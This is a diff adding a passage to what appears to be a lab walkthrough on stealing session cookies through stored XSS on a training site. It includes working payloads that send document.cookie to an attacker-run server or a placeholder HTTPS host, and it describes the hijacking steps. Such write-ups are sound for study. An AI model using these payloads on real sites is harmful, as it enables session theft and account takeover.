@@ -305,4 +305,38 @@ we can run the script with:
  php -S <VPN/TUN Adapter IP>:8000
 ```
 
+lets go back and fill in our vulnerable profile's email and telephone fields because we did not find any vulnerabilities and we want it to appear more legit   
+
+then in the country field we can input our payload: 
+
+```javascript
+<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
+```
+
+note that if we were doing this in the real world we would want to use something like XSSHunter, Burp Collaborator, or Project Interactsh since a default PHP server or netcat might not send data in the correct form when the target web app uses HTTPS
+
+a sample HTTPS payload could look like: 
+
+```javascript
+<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
+```
+
+now to simulate the victim we will login: 
+
+![](Images/Pasted%20image%2020240304181054.png)
+
+our server hosting our script is running and our vulnerable profile has our payload in it so now as the logged in victim lets navigate to our malicious profile by going to `http://xss.htb.net/profile?email=<malicious profile's email>`:
+
+![](Images/Pasted%20image%2020240304181431.png)
+
+we can see that the logic of the log.php file we created executes as we are redirected to google, and we can look at our server to see the response: 
+
+![](Images/Pasted%20image%2020240304181513.png)
+
+we can then look in the cookielog.txt file to see the stolen cookie and then complete a session hijacking attack 
+
+### Obtaining session cookies via XSS (netcat edition)
+
+
+
 
